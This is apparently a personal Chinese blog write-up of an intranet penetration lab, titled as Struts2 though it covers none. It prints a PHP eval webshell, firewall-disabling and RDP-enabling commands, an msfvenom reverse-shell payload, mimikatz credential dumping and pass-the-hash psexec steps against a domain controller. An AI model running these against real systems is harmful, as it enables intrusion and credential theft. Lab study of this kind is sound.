---
layout: post
title: Structs2漏洞复现
categories: [blog ]
tags: [内网渗透,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: shzqiip
---





## <1>靶机环境搭建

ip设置如下：

```java
kali(攻击机):192.168.236.130 
Windows 7 (web服务器)：192.168.236.132（外网和kali连通）、192.168.52.143（内网ip）
Windows 2008(域控): 192.168.52.138
Win2k3(域管): 192.168.52.141
```

可以看到Windows7是双网卡的（`既通外网又通内网` ),Windows7、Windows2008、Win2k3是在52段的局域网内的。

这里肯定是从 Windows7(web服务器)入手， 看有什么漏洞

## <2>外网边界突破

#### （1）、信息收集

直接扫描 Windows 7 (web服务器)：192.168.236.132 看有什么发现

![image-20240103123642941](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103123642941.png)

#### （2）PhpMyAdmin后台Getshell

phpmyadmin有两种getshell方式：

- into outfile导出木马
- 利用Mysql日志文件getshell

发现有一个数据库的服务，弱口令root/root，可以看到有执行sql命令的地方，尝试写马试试

查看网站的路径

![image-20240103130452105](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103130452105.png)

`select '<?php @eval($\_POST\["c"\]);?>' into outfile "C:/phpStudy/MySQL/www/cxk.php"`

发现不能执行这个语句。。。

![image-20240103125553705](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103125553705.png)

这是因为 Mysql新特性secure_file_priv会对读写文件产生影响，该参数用来限制导入导出。我们可以借助`show global variables like '%secure%';`命令来查看该参数

[![img](https://img2023.cnblogs.com/blog/3074366/202303/3074366-20230315183007445-2103222599.png)](https://img2023.cnblogs.com/blog/3074366/202303/3074366-20230315183007445-2103222599.png)

当secure_file_priv为NULL时，表示限制Mysql不允许导入导出，这里为NULL。所以into outfile写入木马出错。要想使得该语句导出成功，则需要在Mysql文件夹下修改my.ini 文件，在[mysqld]内加入secure_file_priv =""。

本来想着直接修改值不就可以了？（`发现是只读属性，那没事了`）

![image-20240103130915175](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103130915175.png)



##### 直接写入木马不行，那我们就换另一种方法---Mysql日志文件写入shel

先执行命令：`show variables like '%general%';`查看日志状态

![image-20240103131108801](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103131108801.png)

 当开启general_log时，所执行的SQL语句都会出现在stu1.log中，发现日志的存储位置，尝试能不能修改为php后缀

`set GLOVAL general_log='on'`

这里写成www根目录，用过phpstudy的应该清楚那个目录结构

```
SET GLOBAL general_log_file='C:/phpStudy/www/cxk.php'
```

![image-20240103131839306](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103131839306.png)

传上去了，直接蚁建

![image-20240103132044867](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103132044867.png)

![image-20240103132103696](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103132103696.png)

### （3）yxcms后台上传getshell

这里字典没有扫到， 但是数据库中有这个名字的数据库，可以尝试访问/yxcms路由

可以看到公告栏中泄露了（账号/密码）直接登录后台

![image-20240103133639084](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103133639084.png)

我们可以修改php文件的内容，但是我们不知道php文件 所在的位置，抓包看一下

![image-20240103133714766](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103133714766.png)

![image-20240103133811886](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103133811886.png)

burp也没找到php文件的存放位置 ，发现还有一个文件是`beifen.rar`，呃呃扫不到直接拿来用的

我们把备份文件解压，在里面寻找模板的这么多php 都存放在了:`/yxcms/protected/apps/default/view/default/`

直接新建一个模板写入马即可

![image-20240103134908312](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103134908312.png)

## <3>内网信息探测

连接上蚁剑后，使用虚拟终端：

发现是双网卡的一个连接外网一个连接内网，首先上传fscan扫描一下（看内网有没有东西）

![image-20240103135645323](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103135645323.png)

上传一个fscan（注意：这里是windows的环境）

直接上传fscan需要因为是windows需要上传后缀是.exe的 `K:\冀信杯渗透测试\fscan.exe`

`fscan -h 192.168.52.0/24 -np -nobr -nopoc > cxk.txt`

```java
C:\phpStudy\WWW> more cxk.txt
start infoscan
192.168.52.141:21 open
192.168.52.143:80 open
192.168.52.138:80 open
192.168.52.138:135 open
192.168.52.143:135 open
192.168.52.141:135 open
192.168.52.143:139 open
192.168.52.141:139 open
192.168.52.138:139 open
192.168.52.143:445 open
192.168.52.141:445 open
192.168.52.138:445 open
192.168.52.143:3306 open
192.168.52.141:7001 open
192.168.52.138:88 open
192.168.52.141:7002 open
```

如果直接访问192.168.52.这个域是访问不到的，所以这时候就需要我们挂代理（只会nps。。）

#### 因为刚接触不久nps这里会详细讲解（可直接省略）

首先启动我们的nps server，默认账号密码  admin/123  K:\冀信杯渗透测试\nps\windows_amd64_server\nps.exe

##### 1、创建一个客户端，可以看到ID：为6（`这里后面要用所以记住`)

![image-20240103141343845](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103141343845.png)

#####  2、创建一个SOCKS代理，这里的端口就是一个映射那种（这是我目前的理解，不一定对）

就相当于所有的流量，都会从这个代理端口中流出,右边的方格就是内网内的机器

![image-20240103141836559](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103141836559.png)

![image-20240103141949718](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103141949718.png)

##### 3、把nps客户端上传到windows靶机上

但是执行确连接不上

```java
**C:\phpStudy\WWW>** npc.exe -server=127.0.0.1:8024 -vkey=nnogm652lv62mvwb -type=tcp
./npc -server=127.0.0.1:8024 -vkey=nnogm652lv62mvwb -type=tcp
**C:\phpStudy\WWW>** npc.exe -server=192.168.100.14:8024 -vkey=rzxdd22ayokt1rnt -type=tcp
```

```java
kali(攻击机):192.168.236.130 
Windows 7 (web服务器)：192.168.236.132（外网和kali连通）、192.168.52.143（内网ip）
Windows 2008(域控): 192.168.52.138
Win2k3(域管): 192.168.52.141
本机：127.0.0.1 / 192.168.236.1 / 192.168.100.14
```

本来一开始用的是 127 和 192.168.100.14这两个没通，后来想明白了（用那俩地址靶机能访问到？？？) 改了之后直接就通了

npc.exe -server=192.168.236.1:8024 -vkey=nnogm652lv62mvwb -type=tcp

![image-20240103193327879](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103193327879.png)

![image-20240103193431062](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103193431062.png)

可以发现我们访问 127.0.0.1:8089 ---->192.168.52.143:80映射了过来

![image-20240103193548753](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103193548753.png)

那么用socks代理搭配Proxifier软件做一个全局代理

![image-20240103194554290](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103194554290.png)

![image-20240103194605150](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103194605150.png)

![image-20240103194620726](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103194620726.png)

地址也可以改成局域网的地址，这样都能访问到，就不用挂多个代理了

![image-20240103194726750](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103194726750.png)

成功

![image-20240103194820787](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103194820787.png)

查看之前fscan的结果发现扫描出了二台主机（138和141 windows版本都扫描出来了）

![image-20240103195130351](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103195130351.png)

### windows挂代理就是上面，但是我的工具基本都在kali里面（所以能不能直接让kali挂上代理）

```java
#如需修改默认占用端口： 修改 /etc/nps/conf 下的 nps.conf 文件
nps 
nps start
nps stop
//查询端口杀死进程
netstat -ntlp
ps -ef|grep nps
kill -9 进程id
```

客户端上传解压 `tar xzvf linux_amd64_client.tar.gz`

```java
./npc -server=192.168.236.130:8024 -vkey=rxvep66lpwxpomss -type=tcp  >/nps.txt  //存储后台启动日志
```

到这里张记性了直接用192.168.236那个ip的地址

（搞笑的是windows系统，不带tar xzvf 所以需要手动一个个文件上传然后进行拼接）

`这里又犯傻了，想在windows靶机上面传一个linux的nps，（😟😟😟）`

![image-20240103205123157](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103205123157.png)

准备搞全局代理，kali我记得是自带proxi这个东西的

```java
proxychains -h //这里就可以看到conf配置文件的位置
```

![image-20240103210644290](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103210644290.png)

`vim /etc/proxychains4.conf`  (端口就是我们设置的在nps中)

![image-20240103210715752](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103210715752.png)

然后使用的话在命令前面加上`proxychains即可`

本来我是用ping来测试通不通内网的一直没字节返回，以为是我自己的错误，但是尝试了一下curl发现通了！

![image-20240103210855741](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103210855741.png)

用dirsearch也是可以扫描的，以此类推fscan这些都是可以的

![image-20240103211019420](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103211019420.png)

因为kali挂的是proxychains 不能在浏览器直接访问对应的页面，这时候可以用windwos本机的Proxifier连接kali里配置的

`需要用的是kali局域网的网段，不能是127.0.0.1`，在这里就是`192.168.236.130`

![image-20240103212842842](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103212842842.png)

![image-20240103212850844](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103212850844.png)

配置完就可以了

```java
这里实现了kali和windows，即linux和windows挂nps代理，以及局域网的共享代理😼😼😼蛮有趣的，大概花费了：6个小时
```

### (2)靶机上线cs

 在kali里 `./teamserver 192.168.136.130 cs123456` 运行cs服务(运行服务端)

![image-20240104124839162](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104124839162.png)

（运行客户端）

`java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar`

首先配置listener监听器

![image-20240104125110603](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104125110603.png)

可以发现有很多种（现在还不太懂各自的用法）

![image-20240104125314882](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104125314882.png)



主机运行CS 客户端并连接 CS 服务端，配置好listener监听器之后，生成 exe后门程序

![image-20240104125413145](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104125413145.png)

然后用蚁剑把生成的artifact.exe上传到靶机上：（成功上线）

![image-20240104125453543](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104125453543.png)

点击这个类似瞄准的按钮，会显示域内的机器

![image-20240104125608889](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104125608889.png)

执行猕猴桃，抓取靶机密码

![image-20240104125735689](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104125735689.png)

![image-20240104125802775](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104125802775.png)

到这里需要登录就不太懂了（润去看看文章）

![image-20240104125831119](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104125831119.png)

`在cs中执行命令需要加上 shell，比如 shell whoami`

### (3)域内信息收集

```java
net view                 # 查看局域网内其他主机名
net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
net user                 # 查看本机用户列表
net user /domain         # 查看域用户
net localgroup administrators # 查看本地管理员组（通常会有域用户）
net view /domain         # 查看有几个域
net user 用户名 /domain   # 获取指定域用户的信息
net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
net group 组名 /domain    # 查看域中某工作组
net group "domain admins" /domain  # 查看域管理员的名字
net group "domain computers" /domain  # 查看域中的其他主机名
net group "doamin controllers" /domain  # 查看域控制器主机名（可能有多台）
```

1、先判断是否存在域，使用`ipconfig /all`查看DNS服务器，发现主DNS后缀不为空，存在`域god.org`

![image-20240107135109265](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107135109265.png)

也可以执行命令`net config workstation`来查看当前计算机名、全名、用户名、系统版本、工作站、域、登录域等全面的信息

![image-20240107135512647](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107135512647.png)

2、上面发现 DNS 服务器名为 god.org，当前登录域为 GOD 再执行`net view /domain`查看有几个域(可能有多个)

3、查看域的组账户信息(工作组)

![image-20240107135624777](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107135624777.png)

4、既然只有一个域，那就利用 net group "domain controllers" /domain 命令查看域控制器主机名，直接确认域控主机的名称为 OWA

![image-20240107135749468](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107135749468.png)

5、确认域控主机的名称为 OWA 再执行 `net view` 查看局域网内其他主机信息（主机名称、IP地址）

![image-20240107135805023](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107135805023.png)

cs中会更加具体一点（主机ip也有）

![image-20240107135845251](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107135845251.png)

扫描出来 除了域控OWA 之外，还有一台主机ROOT-TVI862UBEH

至此内网域信息收集完毕，已知信息：域控主机：192.168.52.138，同时还存在一台域成员主机：192.168.52.141，接下来的目标就是横向渗透拿下域控

### (4)rdp远程登录win7

Win7跳板机 默认是不开启3389的，同时还有防火墙

```java
#注册表开启3389端口
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

#添加防火墙规则
netsh advfirewall firewall add rule name="Open 3389" dir=in action=allow protocol=TCP localport=3389

#关闭防火墙
netsh firewall set opmode disable   			#winsows server 2003 之前
netsh advfirewall set allprofiles state off 	#winsows server 2003 之后
```

或者使用msf中的命令

```java
run getgui -e
run post/windows/manage/enable_rdp  //两个命令都可以开启远程桌面
```

在开启远程桌面之前，我们还需要使用`idletime`命令检查远程用户的空闲时长：idletime

(提示：远程主机和主机，同一时间只会登录一个，所以需要看空闲时长)

##### 这里用的端口转发

portfwd 是meterpreter提供的一种基本的端口转发。porfwd可以反弹单个端口到本地，并且监听，使用方法如下

```java
portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址
```

然后我们只要访问本地的3389端口就可以连接到目标主机的3389端口了

```undefined
rdesktop 127.0.0.1:3389
```

![image-20240107144314884](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107144314884.png)

其他用户：密码从cs插件miti就可以获得

## <4>内网渗透

### (1)把cs中的回话派生到msf中

前提是 cs已经获得了靶机的会话

kali中msf需要进行的操作

```java
msfconsole
set payload windows/meterpreter/reverse_http
set lhost 192.168.236.130
set lport 7777
exploit 
```

这里都是msf的ip和监听的端口

![image-20240104212055352](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104212055352.png)

直接派生回话即可，然后看msf即可

![image-20240104212120119](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104212120119.png)

### (2)msf的简单利用

判断靶机 是否属于虚拟机（检查是否进入了蜜罐）

```java
run post/windows/gather/checkvm
```

![image-20240104212412273](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104212412273.png)

在如调用`post/windows/gather/enum_applications`模块枚举出安装在靶机上的应用程序：

![image-20240104212635472](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104212635472.png)

### (3)添加路由(这里添加路由，只能msf能访问到，msf外不可)

```java
# 可以用模块自动添加路由
run post/multi/manage/autoroute
#添加一条路由
run autoroute -s 192.168.52.0/24
#查看路由添加情况
run autoroute -p
```

![image-20240107145903676](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107145903676.png)

### (4)内网端口扫描

先执行background 命令将当前执行的 Meterpreter 会话切换到后台（后续也可执行sessions -i 重新返回会话），然后使用 MSF 自带 auxiliary/scanner/portscan/tcp 模块扫描内网域成员主机 192.168.52.141 开放的端口：

```java
use auxiliary/scanner/portscan/tcp
set rhosts 192.168.52.141
set ports 80,135-139,445,3306,3389
run
```

![image-20240107150359572](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107150359572.png)

192.168.52.141 win2003域成员机开启了 135、139、445端口

192.168.52.138  域控开启了80、135、139、445端口

### (5)MSF进行ms17-010攻击（未成功）

对于开启了 445 端口的 Windows 服务器肯定是要进行一波永恒之蓝扫描尝试的，借助 MSF 自带的漏洞扫描模块进行扫描：

```java
search ms17_010
use auxiliary/scanner/smb/smb_ms17_010
set rhosts 192.168.52.141
run
```

#### 漏洞利用

```java
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp #内网环境，需要正向shell连接
set rhosts 192.168.52.138
run
```

看很多师傅说一般成功率不高

### (6)哈希传递攻击(PTH)拿下域控

![image-20240107152018482](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107152018482.png)

可以利用抓取到的密码 psexec 利用域管理员账户 Hash login一下 监听器选 windows_smb/bind_pipe

![image-20240107152905930](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107152905930.png)

(采用的SMB，这里本地cs东西太多了，未成功)

拿到正向会话(前面三层内网靶机有讲正向反向)之后，我们可以右键 目标->文件管理

![image-20240107152946686](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107152946686.png)

可以看到域控的文件 我们可以进行上传文件操作，拿下域控

### (7)MSF哈希传递攻击

`run windows/gather/smart_hashdump` 来进行hashdump

需要SYSTEM权限，我们直接getsystem 发现可以正常提权
提到SYSTEM权限之后再执行 `run windows/gather/smart_hashdump`

![image-20240107153454857](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107153454857.png)

得到管理员的密码的hash

```java
[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+]     liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

但是这个只是用户密码的一个hash值，我们在msf里加载mimikatz模块
ps：ms6中 mimikatz模块已经合并为kiwi模块

```java

load kiwi

creds_all  #列举所有凭据
creds_kerberos  #列举所有kerberos凭据
creds_msv  #列举所有msv凭据
creds_ssp  #列举所有ssp凭据
creds_tspkg  #列举所有tspkg凭据
creds_wdigest  #列举所有wdigest凭据
dcsync  #通过DCSync检索用户帐户信息
dcsync_ntlm  #通过DCSync检索用户帐户NTLM散列、SID和RID
golden_ticket_create  #创建黄金票据
kerberos_ticket_list  #列举kerberos票据
kerberos_ticket_purge  #清除kerberos票据
kerberos_ticket_use  #使用kerberos票据
kiwi_cmd  #执行mimikatz的命令，后面接mimikatz.exe的命令
lsa_dump_sam  #dump出lsa的SAM
lsa_dump_secrets  #dump出lsa的密文
password_change  #修改密码
wifi_list  #列出当前用户的wifi配置文件
wifi_list_shared  #列出共享wifi配置文件/编码
```

首先通过 cs获得的

![image-20240107154948501](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107154948501.png)

```java
set smbpass 00000000000000000000000000000000:2ccad3c60ca0adabf81dcf617017ed82
```

2、获得 NTLM Hash：b0093b0887bf1b515a90cf123bce7fba，在 Metasploit 中，经常使用于哈希传递攻击的模块有：

```java
auxiliary/admin/smb/psexec_command   //在目标机器上执行系统命令
exploit/windows/smb/psexec           //用psexec执行系统命令
exploit/windows/smb/psexec_psh       //使用powershell作为payload
```

3、以exploit/windows/smb/psexec模块哈希传递攻击 Windows Server 2008 为例：

```java
use exploit/windows/smb/psexec
set rhosts 192.168.52.138
set smbuser administrator
set smbpass 00000000000000000000000000000000:b0093b0887bf1b515a90cf123bce7fba
set smbdomain god
run
```

![image-20240107160239321](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107160239321.png)

这里很蒙？先学习去了润了（2024.1.7）













## msf生成控制服务器的方式

前提环境：被远控的机器(受害者)，msf所在域(攻击者)必须是相通 ping可以通

```java
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.236.130  LPORT=4444 -f exe > shell.exe
//这里的ip和端口是（攻击者的ip和监听的端口）
windows/meterpreter/reverse
windows/meterpreter/reverse_http, windows/meterpreter/reverse_https  
linux/x86/meterpreter/reverse_tcp  //32位
linux/x86/shell_reverse_tcp      //64位
```

```java
kali 命令窗口通过：msfconsole
    
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.236.130 //这些和上面是对应的
set lport 4444
exploit  //这里其实就是监听端口
```

然后把生成的exe上传到靶机，直接运行

![image-20240103192146938](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103192146938.png)

#### msf解决乱码

```java
chcp 65001即可
```

![image-20240107122137271](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107122137271.png)

## msf建立代理的方式

前提是：msf已经添加了内网网段的路由

```java
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1  #或者默认0.0.0.0
run
```

![image-20240107161436933](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107161436933.png)

2. 编辑proxychains

vim /etc/proxychains4.conf
proxychains4 命令


访问内网主机的web服务

ps：proxychains只对tcp流量有效，所以udp和icmp都是不能代理转发的。

使用namp进行扫描，nmap通过socks代理进行扫描，必须加上 -sT、-Pn两个参数

msf6 auxiliary(server/socks_proxy) > proxychains4 nmap 192.168.10.2 -sT -Pn -p80,445,135
##### -sT  全开扫描，完成三次握手
##### -Pn  不使用ping扫描


 3. 那假如我们要在我们自己的电脑上访问内网了，我们可以将代理服务器的ip设置为vps公网的ip

![image-20240107161833119](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107161833119.png)

 然后浏览器设置socks5代理

还是老老实实的nps叭！



参考链接：[MSF使用详解-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/235631#h3-30)













